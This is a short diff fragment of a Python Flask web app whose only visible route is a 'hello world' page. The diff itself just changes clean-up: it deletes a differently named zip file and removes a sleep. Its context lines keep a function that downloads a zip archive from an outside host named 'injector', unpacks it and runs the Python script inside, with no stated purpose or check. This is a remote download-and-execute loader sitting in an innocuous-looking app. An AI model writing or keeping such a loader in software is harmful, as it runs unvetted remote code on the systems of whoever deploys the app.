@@ -11,8 +11,7 @@ def download_unzip_and_run_script():
         subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/script.zip'])
         subprocess.run(['unzip', '-o', 'script.zip', '-d', 'unzipped_files'])
         subprocess.run(['python', 'unzipped_files/itsmerjc.py'])
-        os.remove('itsmerjc.zip')
-        time.sleep(10)
+        os.remove('script.zip')
 
 @app.route('/')
 def hello_world():
